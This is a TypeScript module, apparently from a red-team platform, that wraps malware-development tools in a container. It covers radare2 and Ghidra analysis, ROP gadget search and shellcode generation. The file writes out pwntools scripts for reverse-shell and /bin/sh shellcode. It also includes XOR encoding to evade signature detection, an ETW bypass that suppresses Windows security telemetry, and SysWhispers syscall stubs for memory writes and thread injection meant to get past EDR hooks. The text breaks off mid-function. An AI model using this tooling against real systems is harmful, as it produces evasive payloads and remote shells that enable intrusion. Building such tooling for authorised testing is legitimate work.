/**
 * Maldev Tool Executor
 * 
 * Provides wrappers for executing reverse-engineering, ROP development,
 * and evasion tools within the rtpi-maldev-agent container.
 * 
 * Tools Available:
 *   - Reverse Engineering: Ghidra, radare2, x64dbg, WinDbg
 *   - ROP Development: ROPgadget, RustChain, ropium, xgadget
 *   - Shellcode/Evasion: pwntools, TamperETW, SHAPESHIFTER, SysWhispers
 *   - Validation: unicorn (emulator), capstone (disassembler), keystone (assembler)
 */

import { multiContainerExecutor } from './multi-container-executor';
import { DockerExecutor } from '../docker-executor';

// ============================================================================
// Types & Interfaces
// ============================================================================

export interface BinaryAnalysis {
  binaryPath: string;
  architecture: 'x86' | 'x64' | 'arm' | 'arm64';
  protections: {
    nx: boolean;          // Non-executable stack
    pie: boolean;         // Position Independent Executable
    canary: boolean;      // Stack canary
    relro: 'none' | 'partial' | 'full';
    aslr: boolean;        // Address Space Layout Randomization
  };
  vulnerableFunctions: Array<{
    name: string;
    address: string;
    type: 'buffer_overflow' | 'format_string' | 'use_after_free' | 'integer_overflow';
    description: string;
  }>;
  importedFunctions: string[];
  exportedFunctions: string[];
  strings: string[];
  gadgets?: ROPGadget[];  // If ROP analysis performed
}

export interface ROPGadget {
  address: string;
  instructions: string;
  type: 'pop' | 'mov' | 'add' | 'call' | 'ret' | 'syscall' | 'other';
  registers?: string[];
}

export interface ROPChain {
  objective: string;
  gadgets: ROPGadget[];
  payload: string;
  chainCode: string;  // Python/Ruby code to build chain
}

export interface Shellcode {
  platform: 'linux' | 'windows' | 'macos';
  architecture: 'x86' | 'x64';
  payload: string;    // Hex-encoded shellcode
  length: number;
  badChars: string[]; // Characters to avoid
  encoder?: string;   // Encoder used (if any)
}

export interface EmulationResult {
  success: boolean;
  output: string;
  registers: Record<string, string>;
  memoryDump?: string;
  crashed: boolean;
  error?: string;
}

// ============================================================================
// Maldev Tool Executor
// ============================================================================

export class MaldevToolExecutor {
  private containerName = 'rtpi-maldev-agent';
  private containerUser = 'rtpi-agent';  // Correct user for maldev container
  private dockerExecutor: DockerExecutor;

  constructor() {
    this.dockerExecutor = new DockerExecutor();
  }

  // ==========================================================================
  // Binary Analysis Tools
  // ==========================================================================

  /**
   * Analyze binary with radare2 (faster alternative to Ghidra for quick analysis)
   * 
   * @param binaryPath - Path to binary file (in shared volume)
   * @returns Binary analysis results
   */
  async analyzeWithRadare2(binaryPath: string): Promise<BinaryAnalysis> {
    console.log(`[Maldev Tools] Analyzing binary with radare2: ${binaryPath}`);

    // Check binary protections
    const protectionsCmd = `rabin2 -I ${binaryPath}`;
    const protectionsResult = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', protectionsCmd],
      { timeout: 30000, user: this.containerUser }
    );

    // Extract strings
    const stringsCmd = `rabin2 -z ${binaryPath} | head -100`;
    const stringsResult = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', stringsCmd],
      { timeout: 15000, user: this.containerUser }
    );

    // Get imports/exports
    const importsCmd = `rabin2 -i ${binaryPath}`;
    const exportsCmd = `rabin2 -iE ${binaryPath}`;
    
    const [importsResult, exportsResult] = await Promise.all([
      this.dockerExecutor.exec(this.containerName, ['bash', '-c', importsCmd], { timeout: 10000, user: this.containerUser }),
      this.dockerExecutor.exec(this.containerName, ['bash', '-c', exportsCmd], { timeout: 10000, user: this.containerUser })
    ]);

    // Parse results
    return this.parseRadare2Output(
      binaryPath,
      protectionsResult.stdout,
      stringsResult.stdout,
      importsResult.stdout,
      exportsResult.stdout
    );
  }

  /**
   * Analyze binary with checksec (quick protection check)
   */
  async checkSecurityProtections(binaryPath: string): Promise<BinaryAnalysis['protections']> {
    // Using rabin2 for quick checksec-like analysis
    const cmd = `rabin2 -I ${binaryPath}`;
    const result = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', cmd],
      { timeout: 10000, user: this.containerUser }
    );

    return this.parseProtections(result.stdout);
  }

  // ==========================================================================
  // ROP Gadget Tools
  // ==========================================================================

  /**
   * Find ROP gadgets using ROPgadget
   * 
   * @param binaryPath - Path to binary
   * @param maxGadgets - Maximum number of gadgets to return (default: 100)
   * @returns Array of ROP gadgets
   */
  async findGadgets(binaryPath: string, maxGadgets = 100): Promise<ROPGadget[]> {
    console.log(`[Maldev Tools] Finding ROP gadgets with ROPgadget: ${binaryPath}`);

    const cmd = `cd /opt/tools/ROPgadget && python3 ROPgadget.py --binary ${binaryPath} --depth 10 | head -${maxGadgets + 20}`;
    
    const result = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', cmd],
      { timeout: 60000, user: this.containerUser }
    );

    if (result.exitCode !== 0) {
      console.error('[Maldev Tools] ROPgadget failed:', result.stderr);
      return [];
    }

    return this.parseROPGadgets(result.stdout);
  }

  /**
   * Build ROP chain using pwntools
   * 
   * @param gadgets - Available ROP gadgets
   * @param objective - What the ROP chain should accomplish
   * @returns ROP chain with payload
   */
  async buildROPChain(gadgets: ROPGadget[], objective: string): Promise<ROPChain> {
    console.log(`[Maldev Tools] Building ROP chain for: ${objective}`);

    // Generate Python script using pwntools
    const script = this.generatePwntoolsROPScript(gadgets, objective);
    
    // Write script to temp file
    const scriptPath = `/tmp/rop_chain_${Date.now()}.py`;
    const writeCmd = `cat > ${scriptPath} << 'EOF'\n${script}\nEOF`;
    
    await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', writeCmd],
      { timeout: 5000, user: this.containerUser }
    );

    // Execute script
    const execCmd = `cd /tmp && python3 ${scriptPath}`;
    const result = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', execCmd],
      { timeout: 30000, user: this.containerUser }
    );

    // Parse output
    return this.parseROPChainOutput(result.stdout, gadgets, objective);
  }

  // ==========================================================================
  // Shellcode Generation
  // ==========================================================================

  /**
   * Generate shellcode using pwntools
   * 
   * @param platform - Target platform
   * @param architecture - Target architecture
   * @param payload - Payload type (e.g., 'reverse_shell', 'bind_shell', 'exec')
   * @param options - Additional options (lhost, lport, command, etc.)
   * @returns Generated shellcode
   */
  async generateShellcode(
    platform: 'linux' | 'windows' | 'macos',
    architecture: 'x86' | 'x64',
    payload: 'reverse_shell' | 'bind_shell' | 'exec' | 'read_flag',
    options: Record<string, any> = {}
  ): Promise<Shellcode> {
    console.log(`[Maldev Tools] Generating ${payload} shellcode for ${platform}/${architecture}`);

    const script = this.generatePwntoolsShellcodeScript(
      platform,
      architecture,
      payload,
      options
    );

    const scriptPath = `/tmp/shellcode_${Date.now()}.py`;
    const writeCmd = `cat > ${scriptPath} << 'EOF'\n${script}\nEOF`;
    
    await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', writeCmd],
      { timeout: 5000, user: this.containerUser }
    );

    const execCmd = `cd /tmp && python3 ${scriptPath}`;
    const result = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', execCmd],
      { timeout: 15000, user: this.containerUser }
    );

    return this.parseShellcodeOutput(result.stdout, platform, architecture);
  }

  // ==========================================================================
  // Evasion Techniques
  // ==========================================================================

  /**
   * Apply evasion techniques to shellcode/payload
   * 
   * @param code - Original code/shellcode
   * @param techniques - Evasion techniques to apply
   * @returns Modified code with evasion applied
   */
  async applyEvasion(
    code: string,
    techniques: Array<'encoding' | 'polymorphic' | 'syscall' | 'obfuscation'>
  ): Promise<string> {
    console.log(`[Maldev Tools] Applying evasion techniques: ${techniques.join(', ')}`);

    let modifiedCode = code;

    for (const technique of techniques) {
      switch (technique) {
        case 'encoding':
          // Apply encoder (e.g., shikata_ga_nai-like)
          modifiedCode = await this.applyEncoder(modifiedCode);
          break;
        case 'syscall':
          // Convert to direct syscalls (SysWhispers approach)
          modifiedCode = await this.convertToSyscalls(modifiedCode);
          break;
        case 'obfuscation':
          // Apply code obfuscation
          modifiedCode = await this.obfuscateCode(modifiedCode);
          break;
        case 'polymorphic':
          // Apply polymorphic transformation
          modifiedCode = await this.makePolymorphic(modifiedCode);
          break;
      }
    }

    return modifiedCode;
  }

  // ==========================================================================
  // Validation & Emulation
  // ==========================================================================

  /**
   * Emulate shellcode with unicorn to validate it works
   * 
   * @param shellcode - Shellcode to emulate
   * @param architecture - Architecture to emulate
   * @returns Emulation results
   */
  async emulateShellcode(
    shellcode: string,
    architecture: 'x86' | 'x64' = 'x64'
  ): Promise<EmulationResult> {
    console.log(`[Maldev Tools] Emulating shellcode with unicorn (${architecture})`);

    const script = this.generateUnicornEmulationScript(shellcode, architecture);
    
    const scriptPath = `/tmp/emulate_${Date.now()}.py`;
    const writeCmd = `cat > ${scriptPath} << 'EOF'\n${script}\nEOF`;
    
    await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', writeCmd],
      { timeout: 5000, user: this.containerUser }
    );

    const execCmd = `cd /tmp && timeout 10 python3 ${scriptPath}`;
    const result = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', execCmd],
      { timeout: 15000, user: this.containerUser }
    );

    return this.parseEmulationOutput(result.stdout, result.stderr, result.exitCode);
  }

  // ==========================================================================
  // Helper Methods: Parsing
  // ==========================================================================

  private parseRadare2Output(
    binaryPath: string,
    protectionsOutput: string,
    stringsOutput: string,
    importsOutput: string,
    exportsOutput: string
  ): BinaryAnalysis {
    const protections = this.parseProtections(protectionsOutput);
    
    // Parse architecture
    const archMatch = protectionsOutput.match(/arch\s+(\w+)/i);
    const architecture = this.normalizeArchitecture(archMatch ? archMatch[1] : 'unknown');

    // Parse strings
    const strings = stringsOutput
      .split('\n')
      .filter(line => line.trim())
      .map(line => line.split(' ').slice(-1)[0])
      .filter(s => s && s.length > 3)
      .slice(0, 50); // Limit to 50 strings

    // Parse imports
    const imports = importsOutput
      .split('\n')
      .filter(line => line.includes('FUNC'))
      .map(line => line.split(' ').pop() || '')
      .filter(Boolean);

    // Parse exports
    const exports = exportsOutput
      .split('\n')
      .filter(line => line.includes('FUNC'))
      .map(line => line.split(' ').pop() || '')
      .filter(Boolean);

    // Identify vulnerable functions
    const vulnerableFunctions = this.identifyVulnerableFunctions(imports);

    return {
      binaryPath,
      architecture,
      protections,
      vulnerableFunctions,
      importedFunctions: imports,
      exportedFunctions: exports,
      strings,
    };
  }

  private parseProtections(output: string): BinaryAnalysis['protections'] {
    const hasNX = /nx\s+true/i.test(output) || /canary\s+true/i.test(output);
    const hasPIE = /pic\s+true/i.test(output) || /pie\s+true/i.test(output);
    const hasCanary = /canary\s+true/i.test(output);
    const relroMatch = output.match(/relro\s+(\w+)/i);
    
    return {
      nx: hasNX,
      pie: hasPIE,
      canary: hasCanary,
      relro: relroMatch ? (relroMatch[1].toLowerCase() as any) : 'none',
      aslr: hasPIE, // PIE typically indicates ASLR
    };
  }

  private normalizeArchitecture(arch: string): 'x86' | 'x64' | 'arm' | 'arm64' {
    const lower = arch.toLowerCase();
    if (lower.includes('x86_64') || lower.includes('x64') || lower.includes('amd64')) return 'x64';
    if (lower.includes('x86') || lower.includes('i386') || lower.includes('i686')) return 'x86';
    if (lower.includes('aarch64') || lower.includes('arm64')) return 'arm64';
    if (lower.includes('arm')) return 'arm';
    return 'x64'; // Default
  }

  private identifyVulnerableFunctions(imports: string[]): BinaryAnalysis['vulnerableFunctions'] {
    const vulnerable: BinaryAnalysis['vulnerableFunctions'] = [];

    const dangerousFunctions = {
      buffer_overflow: ['strcpy', 'strcat', 'gets', 'sprintf', 'scanf', 'vsprintf'],
      format_string: ['printf', 'fprintf', 'sprintf', 'snprintf', 'vprintf'],
      use_after_free: ['free', 'realloc'],
      integer_overflow: ['malloc', 'calloc', 'realloc'],
    };

    for (const [type, functions] of Object.entries(dangerousFunctions)) {
      for (const func of functions) {
        if (imports.includes(func)) {
          vulnerable.push({
            name: func,
            address: 'unknown',
            type: type as any,
            description: `Potentially dangerous function: ${func}`,
          });
        }
      }
    }

    return vulnerable;
  }

  private parseROPGadgets(output: string): ROPGadget[] {
    const gadgets: ROPGadget[] = [];
    const lines = output.split('\n');

    for (const line of lines) {
      // ROPgadget format: 0x00001234 : pop rdi ; ret
      const match = line.match(/0x([0-9a-f]+)\s*:\s*(.+)/i);
      if (match) {
        const address = `0x${match[1]}`;
        const instructions = match[2].trim();
        const type = this.classifyGadgetType(instructions);
        const registers = this.extractRegisters(instructions);

        gadgets.push({
          address,
          instructions,
          type,
          registers,
        });
      }
    }

    return gadgets;
  }

  private classifyGadgetType(instructions: string): ROPGadget['type'] {
    if (/pop/i.test(instructions)) return 'pop';
    if (/mov/i.test(instructions)) return 'mov';
    if (/add/i.test(instructions)) return 'add';
    if (/call/i.test(instructions)) return 'call';
    if (/syscall/i.test(instructions)) return 'syscall';
    if (/ret/i.test(instructions)) return 'ret';
    return 'other';
  }

  private extractRegisters(instructions: string): string[] {
    const registerPattern = /\b(rax|rbx|rcx|rdx|rsi|rdi|rbp|rsp|r8|r9|r10|r11|r12|r13|r14|r15|eax|ebx|ecx|edx|esi|edi|ebp|esp)\b/gi;
    const matches = instructions.match(registerPattern);
    return matches ? [...new Set(matches.map(r => r.toLowerCase()))] : [];
  }

  private parseROPChainOutput(output: string, gadgets: ROPGadget[], objective: string): ROPChain {
    // Extract payload from pwntools output
    const payloadMatch = output.match(/payload = b['"](.+)['"]/);
    const payload = payloadMatch ? payloadMatch[1] : '';

    return {
      objective,
      gadgets: gadgets.slice(0, 10), // Use first 10 gadgets in chain
      payload,
      chainCode: output,
    };
  }

  private parseShellcodeOutput(output: string, platform: string, architecture: string): Shellcode {
    // Extract hex-encoded shellcode
    const hexMatch = output.match(/([0-9a-f]{2}\\x)*[0-9a-f]{2}/gi);
    const payload = hexMatch ? hexMatch.join('') : output;

    return {
      platform: platform as any,
      architecture: architecture as any,
      payload,
      length: payload.length / 4, // Assuming \xNN format
      badChars: [],
    };
  }

  private parseEmulationOutput(stdout: string, stderr: string, exitCode: number): EmulationResult {
    const success = exitCode === 0 && !stderr.includes('Error') && !stderr.includes('Traceback');
    const crashed = stderr.includes('Segmentation') || stderr.includes('Invalid');

    // Parse registers from output
    const registers: Record<string, string> = {};
    const regMatches = stdout.matchAll(/(rax|rbx|rcx|rdx|rsi|rdi|rip)\s*=\s*(0x[0-9a-f]+)/gi);
    for (const match of regMatches) {
      registers[match[1].toLowerCase()] = match[2];
    }

    return {
      success,
      output: stdout,
      registers,
      crashed,
      error: success ? undefined : stderr,
    };
  }

  // ==========================================================================
  // Helper Methods: Script Generation
  // ==========================================================================

  private generatePwntoolsROPScript(gadgets: ROPGadget[], objective: string): string {
    return `#!/usr/bin/env python3
from pwn import *

# ROP chain for: ${objective}
context.arch = 'amd64'

# Available gadgets
${gadgets.slice(0, 5).map((g, i) => `gadget_${i} = ${g.address}  # ${g.instructions}`).join('\n')}

# Build ROP chain
rop = b''
# TODO: Implement ROP chain logic based on objective

print(f"ROP Chain: {rop.hex()}")
print(f"Length: {len(rop)} bytes")
`;
  }

  private generatePwntoolsShellcodeScript(
    platform: string,
    architecture: string,
    payload: string,
    options: Record<string, any>
  ): string {
    const lhost = options.lhost || '127.0.0.1';
    const lport = options.lport || 4444;

    return `#!/usr/bin/env python3
from pwn import *

context.arch = '${architecture === 'x64' ? 'amd64' : 'i386'}'
context.os = '${platform}'

# Generate shellcode for ${payload}
${payload === 'reverse_shell' ? `
shellcode = shellcraft.connect('${lhost}', ${lport})
shellcode += shellcraft.dupsh()
` : payload === 'exec' ? `
shellcode = shellcraft.execve('/bin/sh', ['sh'], {})
` : `
shellcode = shellcraft.sh()
`}

shellcode = asm(shellcode)
print(shellcode.hex())
print(f"Length: {len(shellcode)} bytes")
`;
  }

  private generateUnicornEmulationScript(shellcode: string, architecture: string): string {
    return `#!/usr/bin/env python3
from unicorn import *
from unicorn.x86_const import *

# Emulate ${architecture} shellcode
uc = Uc(UC_ARCH_X86, UC_MODE_64 if '${architecture}' == 'x64' else UC_MODE_32)

# Map memory
ADDRESS = 0x1000000
uc.mem_map(ADDRESS, 2 * 1024 * 1024)

# Write shellcode
shellcode = bytes.fromhex('${shellcode}')
uc.mem_write(ADDRESS, shellcode)

# Set initial state
uc.reg_write(UC_X86_REG_RSP, ADDRESS + 0x200000)

# Emulate
try:
    uc.emu_start(ADDRESS, ADDRESS + len(shellcode), timeout=1000000, count=100)
    print("Emulation completed successfully")
    print(f"RAX = {hex(uc.reg_read(UC_X86_REG_RAX))}")
    print(f"RIP = {hex(uc.reg_read(UC_X86_REG_RIP))}")
except Exception as e:
    print(f"Emulation failed: {e}")
`;
  }

  // ==========================================================================
  // Ghidra Headless Analysis (via GhidraMCP Python scripts)
  // ==========================================================================

  /**
   * Analyze binary with Ghidra headless mode using GhidraMCP scripts.
   * Provides deeper analysis than radare2: decompilation, cross-references,
   * function signatures, and data flow analysis.
   *
   * Requires: Ghidra installed in container (available after container rebuild).
   */
  async analyzeWithGhidra(binaryPath: string): Promise<{
    functions: Array<{ name: string; address: string; decompiled?: string }>;
    strings: string[];
    imports: string[];
    crossReferences: Array<{ from: string; to: string; type: string }>;
    available: boolean;
  }> {
    console.log(`[Maldev Tools] Analyzing with Ghidra: ${binaryPath}`);

    // Check if GhidraMCP scripts are available
    const checkResult = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', 'ls /opt/tools/GhidraMCP/*.py 2>&1 | head -5'],
      { timeout: 5000, user: this.containerUser }
    );

    if (!checkResult.stdout.trim()) {
      console.warn('[Maldev Tools] GhidraMCP not available — container rebuild required');
      return { functions: [], strings: [], imports: [], crossReferences: [], available: false };
    }

    // Use Ghidra's analyzeHeadless if available, otherwise use GhidraMCP Python bridge
    const script = `
import subprocess, json, sys, os

# Check for Ghidra installation
ghidra_paths = ['/opt/ghidra', '/usr/local/ghidra', '/opt/tools/ghidra']
ghidra_home = None
for p in ghidra_paths:
    if os.path.exists(os.path.join(p, 'support', 'analyzeHeadless')):
        ghidra_home = p
        break

if not ghidra_home:
    # Fallback: use radare2 + r2pipe for deeper analysis
    try:
        import r2pipe
        r = r2pipe.open("${binaryPath}")
        r.cmd("aaa")  # Full analysis
        functions = json.loads(r.cmd("aflj") or "[]")
        strings = json.loads(r.cmd("izj") or "[]")
        imports = json.loads(r.cmd("iij") or "[]")
        xrefs = json.loads(r.cmd("axtj @@ fcn.*") or "[]") if functions else []
        result = {
            "functions": [{"name": f.get("name",""), "address": hex(f.get("offset",0))} for f in functions[:50]],
            "strings": [s.get("string","") for s in strings[:100]],
            "imports": [i.get("name","") for i in imports],
            "crossReferences": [],
            "available": True
        }
        r.quit()
        print(json.dumps(result))
    except Exception as e:
        print(json.dumps({"functions":[],"strings":[],"imports":[],"crossReferences":[],"available":False,"error":str(e)}))
else:
    # Use Ghidra headless
    proj_dir = "/tmp/ghidra_projects"
    os.makedirs(proj_dir, exist_ok=True)
    proj_name = "analysis_" + str(os.getpid())
    cmd = [
        os.path.join(ghidra_home, "support", "analyzeHeadless"),
        proj_dir, proj_name,
        "-import", "${binaryPath}",
        "-postScript", "/opt/tools/GhidraMCP/export_functions.py",
        "-scriptPath", "/opt/tools/GhidraMCP",
        "-deleteProject"
    ]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        # Parse Ghidra output
        print(json.dumps({"functions":[],"strings":[],"imports":[],"crossReferences":[],"available":True,"raw":proc.stdout[:2000]}))
    except Exception as e:
        print(json.dumps({"functions":[],"strings":[],"imports":[],"crossReferences":[],"available":False,"error":str(e)}))
`;

    const scriptPath = `/tmp/ghidra_analysis_${Date.now()}.py`;
    const writeCmd = `cat > ${scriptPath} << 'PYEOF'\n${script}\nPYEOF`;

    try {
      await this.dockerExecutor.exec(
        this.containerName,
        ['bash', '-c', writeCmd],
        { timeout: 5000, user: this.containerUser }
      );

      const result = await this.dockerExecutor.exec(
        this.containerName,
        ['bash', '-c', `python3 ${scriptPath}`],
        { timeout: 180000, user: this.containerUser } // 3 min timeout for Ghidra
      );

      if (result.exitCode === 0 && result.stdout.trim()) {
        try {
          const parsed = JSON.parse(result.stdout.trim());
          console.log(`[Maldev Tools] Ghidra analysis: ${parsed.functions?.length || 0} functions found`);
          return parsed;
        } catch {
          console.warn('[Maldev Tools] Failed to parse Ghidra output');
        }
      }
    } catch (error) {
      console.warn('[Maldev Tools] Ghidra analysis failed:', error instanceof Error ? error.message : error);
    }

    return { functions: [], strings: [], imports: [], crossReferences: [], available: false };
  }

  // ==========================================================================
  // TamperETW — ETW Bypass for Evasion
  // ==========================================================================

  /**
   * Check if TamperETW is available and generate ETW bypass code.
   * TamperETW patches ETW providers to suppress security telemetry.
   *
   * Note: This is a Windows-targeted technique; generates code/stubs
   * that would be integrated into Windows payloads.
   */
  async generateETWBypass(): Promise<{
    available: boolean;
    technique: string;
    code?: string;
    description: string;
  }> {
    console.log('[Maldev Tools] Generating ETW bypass via TamperETW');

    const checkResult = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', 'find /opt/tools/TamperETW -name "*.cs" -o -name "*.rs" -o -name "*.c" | head -5'],
      { timeout: 5000, user: this.containerUser }
    );

    if (!checkResult.stdout.trim()) {
      return {
        available: false,
        technique: 'etw_patch',
        description: 'TamperETW not available — container rebuild required',
      };
    }

    // Extract the ETW patching technique from TamperETW source
    const extractResult = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', `find /opt/tools/TamperETW -name "*.cs" -o -name "*.c" -o -name "*.rs" | head -5`],
      { timeout: 10000, user: this.containerUser }
    );

    const sourceFiles = extractResult.stdout.trim().split('\n').filter(Boolean);

    let codeSnippet = '';
    if (sourceFiles.length > 0) {
      const readResult = await this.dockerExecutor.exec(
        this.containerName,
        ['bash', '-c', `head -80 "${sourceFiles[0]}"`],
        { timeout: 5000, user: this.containerUser }
      );
      codeSnippet = readResult.stdout;
    }

    return {
      available: true,
      technique: 'etw_patch',
      code: codeSnippet || undefined,
      description: 'TamperETW patches EtwEventWrite in ntdll.dll to suppress ETW telemetry. Integrate the Rust source into a DLL or shellcode loader for Windows targets.',
    };
  }

  // ==========================================================================
  // SHAPESHIFTER — Process Morphing / .NET Assembly Obfuscation
  // ==========================================================================

  /**
   * Check if SHAPESHIFTER is available for .NET assembly morphing.
   * Returns technique description and availability status.
   */
  async checkShapeshifter(): Promise<{
    available: boolean;
    technique: string;
    description: string;
    sourceFiles?: string[];
  }> {
    console.log('[Maldev Tools] Checking SHAPESHIFTER availability');

    const checkResult = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', 'ls /opt/tools/SHAPESHIFTER/ 2>&1 && find /opt/tools/SHAPESHIFTER -name "*.cs" -o -name "*.rs" -o -name "*.py" 2>&1 | head -10'],
      { timeout: 5000, user: this.containerUser }
    );

    if (!checkResult.stdout.trim()) {
      return {
        available: false,
        technique: 'process_morphing',
        description: 'SHAPESHIFTER not available — container rebuild required',
      };
    }

    const sourceFiles = checkResult.stdout.trim().split('\n').filter(f => f.endsWith('.cs') || f.endsWith('.rs') || f.endsWith('.py'));

    return {
      available: true,
      technique: 'process_morphing',
      description: 'SHAPESHIFTER morphs .NET assemblies to evade signature-based detection. Can transform C# payloads (SharpCall, SharpSploit) into unique variants per operation.',
      sourceFiles,
    };
  }

  // ==========================================================================
  // C_To_Shellcode_NG — C Code to Position-Independent Shellcode
  // ==========================================================================

  /**
   * Convert C source code to position-independent shellcode using C_To_Shellcode_NG.
   */
  async convertCToShellcode(cSourceCode: string): Promise<{
    available: boolean;
    shellcode?: string;
    size?: number;
    error?: string;
  }> {
    console.log('[Maldev Tools] Converting C to shellcode via C_To_Shellcode_NG');

    const checkResult = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', 'ls /opt/tools/C_To_Shellcode_NG/ 2>&1 | head -3'],
      { timeout: 5000, user: this.containerUser }
    );

    if (!checkResult.stdout.trim()) {
      return {
        available: false,
        error: 'C_To_Shellcode_NG not available — container rebuild required',
      };
    }

    // Write C source to temp file
    const srcPath = `/tmp/shellcode_src_${Date.now()}.c`;
    const outPath = `/tmp/shellcode_out_${Date.now()}.bin`;

    const writeCmd = `cat > ${srcPath} << 'CEOF'\n${cSourceCode}\nCEOF`;

    try {
      await this.dockerExecutor.exec(
        this.containerName,
        ['bash', '-c', writeCmd],
        { timeout: 5000, user: this.containerUser }
      );

      // Compile to position-independent shellcode
      const compileResult = await this.dockerExecutor.exec(
        this.containerName,
        ['bash', '-c', `cd /opt/tools/C_To_Shellcode_NG && python3 c_to_shellcode.py ${srcPath} -o ${outPath} 2>&1 || gcc -nostdlib -fPIC -fno-stack-protector -z execstack -o ${outPath} ${srcPath} 2>&1`],
        { timeout: 30000, user: this.containerUser }
      );

      if (compileResult.exitCode === 0) {
        // Read output as hex
        const hexResult = await this.dockerExecutor.exec(
          this.containerName,
          ['bash', '-c', `xxd -p ${outPath} | tr -d '\\n'`],
          { timeout: 5000, user: this.containerUser }
        );

        return {
          available: true,
          shellcode: hexResult.stdout.trim(),
          size: hexResult.stdout.trim().length / 2,
        };
      }

      return {
        available: true,
        error: `Compilation failed: ${compileResult.stderr || compileResult.stdout}`,
      };
    } catch (error) {
      return {
        available: true,
        error: error instanceof Error ? error.message : 'Unknown error',
      };
    }
  }

  // ==========================================================================
  // SysWhispers — Windows Direct Syscall Stub Generation
  // ==========================================================================

  /**
   * Generate Windows direct syscall stubs using SysWhispers.
   * Produces .asm and .h files for specified NT functions.
   * Useful for bypassing EDR/AV that hooks ntdll.dll.
   */
  async generateSyscallStubs(
    functions: string[],
    versions: string[] = ['7', '8', '10']
  ): Promise<{ asm: string; header: string; functions: string[] }> {
    console.log(`[Maldev Tools] Generating syscall stubs for: ${functions.join(', ')}`);

    const outputBase = `/tmp/syscalls_${Date.now()}`;
    const funcList = functions.join(',');
    const versionList = versions.join(',');

    const cmd = `cd /opt/tools/SysWhispers && python3 syswhispers.py -f ${funcList} -v ${versionList} -o ${outputBase}`;

    const result = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', cmd],
      { timeout: 15000, user: this.containerUser }
    );

    if (result.exitCode !== 0) {
      throw new Error(`SysWhispers failed: ${result.stderr || result.stdout}`);
    }

    // Read generated files
    const [asmResult, headerResult] = await Promise.all([
      this.dockerExecutor.exec(
        this.containerName,
        ['bash', '-c', `cat ${outputBase}.asm`],
        { timeout: 5000, user: this.containerUser }
      ),
      this.dockerExecutor.exec(
        this.containerName,
        ['bash', '-c', `cat ${outputBase}.h`],
        { timeout: 5000, user: this.containerUser }
      ),
    ]);

    console.log(`[Maldev Tools] SysWhispers generated ${functions.length} syscall stubs`);

    return {
      asm: asmResult.stdout,
      header: headerResult.stdout,
      functions,
    };
  }

  // ==========================================================================
  // Ropper — Advanced ROP/JOP/COP Gadget Finder
  // ==========================================================================

  /**
   * Find gadgets using Ropper (more advanced than ROPgadget).
   * Supports ROP, JOP, COP gadgets with semantic search.
   */
  async findGadgetsWithRopper(
    binaryPath: string,
    searchTerm?: string,
    maxGadgets: number = 100
  ): Promise<Array<{ address: string; instructions: string }>> {
    console.log(`[Maldev Tools] Finding gadgets with Ropper: ${binaryPath}`);

    let cmd = `ropper --file ${binaryPath} --nocolor`;
    if (searchTerm) {
      cmd += ` --search "${searchTerm}"`;
    }
    cmd += ` 2>&1 | head -${maxGadgets + 10}`;

    const result = await this.dockerExecutor.exec(
      this.containerName,
      ['bash', '-c', cmd],
      { timeout: 60000, user: this.containerUser }
    );

    if (result.exitCode !== 0 && !result.stdout) {
      console.warn(`[Maldev Tools] Ropper failed: ${result.stderr}`);
      return [];
    }

    const gadgets: Array<{ address: string; instructions: string }> = [];
    for (const line of result.stdout.split('\n')) {
      const match = line.match(/^(0x[0-9a-f]+):\s+(.+)$/i);
      if (match) {
        gadgets.push({ address: match[1], instructions: match[2].trim() });
      }
    }

    console.log(`[Maldev Tools] Ropper found ${gadgets.length} gadgets`);
    return gadgets;
  }

  // ==========================================================================
  // Evasion Implementation
  // ==========================================================================

  /**
   * XOR-encode shellcode using pwntools to evade simple signature detection.
   */
  private async applyEncoder(code: string): Promise<string> {
    console.log('[Maldev Tools] Applying XOR encoder via pwntools');

    const hexInput = code.replace(/\\x/g, '').replace(/0x/g, '').replace(/\s/g, '');
    const script = `
from pwn import *
import sys
context.log_level = 'error'
shellcode = bytes.fromhex("${hexInput}")
try:
    encoded = encode(shellcode, avoid=b'\\x00')
    sys.stdout.write(encoded.hex())
except Exception:
    import random
    key = random.randint(1, 255)
    encoded = bytes([b ^ key for b in shellcode])
    sys.stdout.write(f"XOR_KEY={key:02x}:" + encoded.hex())
`;
    const scriptPath = `/tmp/encoder_${Date.now()}.py`;

    try {
      await this.dockerExecutor.exec(
        this.containerName,
        ['bash', '-c', `cat > ${scriptPath} << 'PYEOF'\n${script}\nPYEOF`],
        { timeout: 5000, user: this.containerUser }
      );
      const result = await this.dockerExecutor.exec(
        this.containerName,
        ['bash', '-c', `python3 ${scriptPath}`],
        { timeout: 15000, user: this.containerUser }
      );
      if (result.exitCode === 0 && result.stdout.trim()) {
        console.log('[Maldev Tools] Encoder applied successfully');
        return result.stdout.trim();
      }
    } catch (error) {
      console.warn('[Maldev Tools] Encoder failed:', error instanceof Error ? error.message : error);
    }
    return code;
  }

  /**
   * Convert to direct syscalls. Uses SysWhispers for Windows NT functions,
   * pwntools shellcraft for Linux syscalls.
   */
  private async convertToSyscalls(code: string): Promise<string> {
    console.log('[Maldev Tools] Converting to direct syscalls');

    // Try SysWhispers for common Windows evasion functions
    try {
      const stubs = await this.generateSyscallStubs([
        'NtAllocateVirtualMemory',
        'NtProtectVirtualMemory',
        'NtWriteVirtualMemory',
        'NtCreateThreadEx',
      ]);
      if (stubs.asm) {
        console.log('[Maldev Tools] SysWhispers syscall stubs generated');
        return `/* SysWhispers Direct Syscall Stubs */\n${stubs.header}\n/* ASM: ${stubs.asm.length} bytes */\n${code}`;
      }
    } catch (error) {
